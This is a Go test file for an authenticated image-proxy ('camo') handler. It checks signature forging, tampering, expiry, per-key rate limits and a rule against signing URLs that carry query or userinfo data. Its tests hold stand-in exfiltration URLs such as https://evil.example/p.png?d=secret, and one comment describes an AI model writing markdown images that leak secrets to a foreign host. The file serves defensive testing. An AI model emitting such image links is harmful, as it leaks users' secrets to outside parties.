package handler

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/GottZ/ctx/internal/auth"
	"github.com/GottZ/ctx/internal/camo"
	"github.com/go-chi/chi/v5"
)

const camoKey = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"

func enabledCamo(t *testing.T) *camo.Service {
	t.Helper()
	svc, err := camo.New(camoKey, "", camo.DefaultTTL, camo.DefaultMaxBytes)
	if err != nil {
		t.Fatalf("camo.New: %v", err)
	}
	return svc
}

// withAuth attaches an AuthResult so the sign handler can key its rate limiter.
func withAuth(r *http.Request, keyID string) *http.Request {
	ar := &auth.AuthResult{ApiKeyID: keyID, IsValid: true}
	return r.WithContext(context.WithValue(r.Context(), authResultKey, ar))
}

// sign (auth-gated mint).

func TestCamoSign_DisabledIs404(t *testing.T) {
	h := NewCamoHandler(&camo.Service{}) // disabled
	rec := httptest.NewRecorder()
	req := withAuth(httptest.NewRequest(http.MethodPost, "/api/img/sign", strings.NewReader(`{"urls":["https://e.com/a.png"]}`)), "k1")
	h.HandleSign(rec, req)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("disabled sign status = %d, want 404", rec.Code)
	}
}

func TestCamoSign_MintsProxiableOnly(t *testing.T) {
	h := NewCamoHandler(enabledCamo(t))
	body := `{"origin":"issue","urls":["https://e.com/a.png","/relative.png","data:image/png;base64,AAAA","mailto:x@y","https://e.com/b.jpg"]}`
	rec := httptest.NewRecorder()
	h.HandleSign(rec, withAuth(httptest.NewRequest(http.MethodPost, "/api/img/sign", strings.NewReader(body)), "k1"))
	if rec.Code != http.StatusOK {
		t.Fatalf("sign status = %d, want 200 (body %s)", rec.Code, rec.Body.String())
	}
	var resp struct {
		Success    bool              `json:"success"`
		Signatures map[string]string `json:"signatures"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	if !resp.Success {
		t.Error("success = false")
	}
	// Only the two absolute http(s) URLs get signed.
	if len(resp.Signatures) != 2 {
		t.Fatalf("signed %d urls, want 2: %v", len(resp.Signatures), resp.Signatures)
	}
	for _, u := range []string{"https://e.com/a.png", "https://e.com/b.jpg"} {
		p, ok := resp.Signatures[u]
		if !ok {
			t.Errorf("missing signature for %s", u)
			continue
		}
		if !strings.HasPrefix(p, "/api/img/") {
			t.Errorf("signed path %q not under /api/img/", p)
		}
	}
	for _, u := range []string{"/relative.png", "data:image/png;base64,AAAA", "mailto:x@y"} {
		if _, ok := resp.Signatures[u]; ok {
			t.Errorf("non-proxiable %s was signed", u)
		}
	}
}

func TestCamoSign_RateLimited(t *testing.T) {
	// Drive one key past the per-key budget; the very next call is 429 while a
	// DIFFERENT key still succeeds (independent bucket).
	h := NewCamoHandler(enabledCamo(t))
	send := func(key string) int {
		rec := httptest.NewRecorder()
		h.HandleSign(rec, withAuth(httptest.NewRequest(http.MethodPost, "/api/img/sign", strings.NewReader(`{"urls":[]}`)), key))
		return rec.Code
	}
	got429 := false
	for i := 0; i < 200; i++ {
		if send("hot") == http.StatusTooManyRequests {
			got429 = true
			break
		}
	}
	if !got429 {
		t.Fatal("sign never rate-limited within 200 calls")
	}
	if code := send("cold"); code != http.StatusOK {
		t.Errorf("independent key status = %d, want 200 (rate limit leaked across keys)", code)
	}
}

// fetch (auth-less, signature = capability).

// routeFetch runs a GET through a chi router so chi.URLParam("sig") resolves.
func routeFetch(h *CamoHandler, target string) *httptest.ResponseRecorder {
	r := chi.NewRouter()
	r.Get("/api/img/{sig}", h.HandleFetch)
	rec := httptest.NewRecorder()
	r.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, target, nil))
	return rec
}

func TestCamoFetch_DisabledIs404(t *testing.T) {
	rec := routeFetch(NewCamoHandler(&camo.Service{}), "/api/img/abc?url=https://e.com/a.png&exp=99999999999")
	if rec.Code != http.StatusNotFound {
		t.Fatalf("disabled fetch status = %d, want 404", rec.Code)
	}
}

func TestCamoFetch_ForgedSigIs403(t *testing.T) {
	h := NewCamoHandler(enabledCamo(t))
	exp := time.Now().Add(time.Hour).Unix()
	rec := routeFetch(h, "/api/img/deadbeef?url="+url.QueryEscape("https://e.com/a.png")+"&exp="+itoa(exp))
	if rec.Code != http.StatusForbidden {
		t.Fatalf("forged sig status = %d, want 403", rec.Code)
	}
	// No image body on the error (D7) and a no-store cache header.
	if cc := rec.Header().Get("Cache-Control"); cc != "no-store" {
		t.Errorf("error Cache-Control = %q, want no-store", cc)
	}
}

func TestCamoFetch_TamperedURLIs403(t *testing.T) {
	// A signature valid for URL A must not authorize fetching URL B.
	svc := enabledCamo(t)
	h := NewCamoHandler(svc)
	signed := svc.SignedPath("https://e.com/a.png")
	sig := strings.TrimPrefix(strings.SplitN(signed, "?", 2)[0], "/api/img/")
	exp := time.Now().Add(time.Hour).Unix()
	rec := routeFetch(h, "/api/img/"+sig+"?url="+url.QueryEscape("https://evil.example/b.png")+"&exp="+itoa(exp))
	if rec.Code != http.StatusForbidden {
		t.Fatalf("tampered-url status = %d, want 403", rec.Code)
	}
}

func TestCamoFetch_ExpiredIs410(t *testing.T) {
	// A correctly-signed but expired capability is distinguishable (410 Gone) and
	// triggers ZERO fetch.
	svc := enabledCamo(t)
	h := NewCamoHandler(svc)
	pastExp := time.Now().Add(-time.Hour).Unix()
	signed := svc.SignedPathAt("https://e.com/a.png", pastExp)
	rec := routeFetch(h, signed)
	if rec.Code != http.StatusGone {
		t.Fatalf("expired sig status = %d, want 410 (path %s)", rec.Code, signed)
	}
}

func TestCamoFetch_MalformedExpIs403(t *testing.T) {
	h := NewCamoHandler(enabledCamo(t))
	rec := routeFetch(h, "/api/img/abc?url="+url.QueryEscape("https://e.com/a.png")+"&exp=notanumber")
	if rec.Code != http.StatusForbidden {
		t.Fatalf("malformed exp status = %d, want 403", rec.Code)
	}
}

func itoa(n int64) string { return strconv.FormatInt(n, 10) }

// Origin + mint rule (GHSA 2026-10-31 §7).

// signCall posts body to the sign handler and decodes the response.
func signCall(t *testing.T, h *CamoHandler, body string) (int, map[string]string) {
	t.Helper()
	rec := httptest.NewRecorder()
	h.HandleSign(rec, withAuth(httptest.NewRequest(http.MethodPost, "/api/img/sign", strings.NewReader(body)), "k1"))
	var resp struct {
		Signatures map[string]string `json:"signatures"`
	}
	_ = json.Unmarshal(rec.Body.Bytes(), &resp)
	return rec.Code, resp.Signatures
}

func TestCamoSign_RefusesQueryUserinfoAndLongPath(t *testing.T) {
	// Issue content stays automatic, but no origin gets a URL that can carry a
	// payload to the foreign host: the model writes ![](https://evil/?d=<secret>).
	h := NewCamoHandler(enabledCamo(t))
	longPath := "https://e.com/" + strings.Repeat("a", camo.MaxPathLen)
	body, _ := json.Marshal(map[string]any{
		"origin": "issue",
		"urls": []string{
			"https://e.com/ok.png",
			"https://evil.example/p.png?d=secret",
			"https://secret@evil.example/p.png",
			longPath,
		},
	})
	code, sigs := signCall(t, h, string(body))
	if code != http.StatusOK {
		t.Fatalf("status = %d, want 200", code)
	}
	if len(sigs) != 1 || sigs["https://e.com/ok.png"] == "" {
		t.Fatalf("signed %v, want exactly https://e.com/ok.png", sigs)
	}

	for _, u := range []string{"https://evil.example/p.png?d=secret", "https://evil.example/p.png?"} {
		b, _ := json.Marshal(map[string]any{"origin": "assistant", "urls": []string{u}})
		code, sigs = signCall(t, h, string(b))
		if code != http.StatusOK || len(sigs) != 0 {
			t.Errorf("assistant %q: status %d signatures %v, want 200 and none", u, code, sigs)
		}
	}
}

func TestCamoSign_AssistantOneURLPerRequest(t *testing.T) {
	h := NewCamoHandler(enabledCamo(t))

	// The click signs exactly the clicked image.
	code, sigs := signCall(t, h, `{"origin":"assistant","urls":["https://e.com/a.png"]}`)
	if code != http.StatusOK || sigs["https://e.com/a.png"] == "" {
		t.Fatalf("single assistant url: status %d sigs %v, want 200 + signature", code, sigs)
	}
	// A duplicate of the same URL is still one image.
	if code, _ = signCall(t, h, `{"origin":"assistant","urls":["https://e.com/a.png","https://e.com/a.png"]}`); code != http.StatusOK {
		t.Errorf("duplicate single url: status %d, want 200", code)
	}
	// A batch is a render-time sign: refused whole, nothing signed.
	code, sigs = signCall(t, h, `{"origin":"assistant","urls":["https://e.com/a.png","https://e.com/b.png"]}`)
	if code != http.StatusBadRequest || len(sigs) != 0 {
		t.Errorf("assistant batch: status %d sigs %v, want 400 and none", code, sigs)
	}
	// An absent origin gets the assistant rule (fail-closed default).
	if code, _ = signCall(t, h, `{"urls":["https://e.com/a.png","https://e.com/b.png"]}`); code != http.StatusBadRequest {
		t.Errorf("batch without origin: status %d, want 400", code)
	}
	// Issue content keeps batch signing.
	code, sigs = signCall(t, h, `{"origin":"issue","urls":["https://e.com/a.png","https://e.com/b.png"]}`)
	if code != http.StatusOK || len(sigs) != 2 {
		t.Errorf("issue batch: status %d sigs %v, want 200 + 2", code, sigs)
	}
}

func TestCamoSign_UnknownOriginIs400(t *testing.T) {
	h := NewCamoHandler(enabledCamo(t))
	if code, _ := signCall(t, h, `{"origin":"chat","urls":["https://e.com/a.png"]}`); code != http.StatusBadRequest {
		t.Fatalf("unknown origin status = %d, want 400", code)
	}
}

func TestCamoFetch_QueryURLRefusedDespiteValidSig(t *testing.T) {
	// A signature minted before the rule (SignedPath signs whatever it is
	// handed) must not be redeemable for a query-carrying URL: 403, ZERO fetch
	// — the host does not even resolve, so a fetch attempt would be a 502.
	svc := enabledCamo(t)
	h := NewCamoHandler(svc)
	for _, u := range []string{"https://evil.invalid/p.png?d=secret", "https://secret@evil.invalid/p.png"} {
		rec := routeFetch(h, svc.SignedPath(u))
		if rec.Code != http.StatusForbidden {
			t.Errorf("redeem %q: status %d, want 403", u, rec.Code)
		}
	}
}
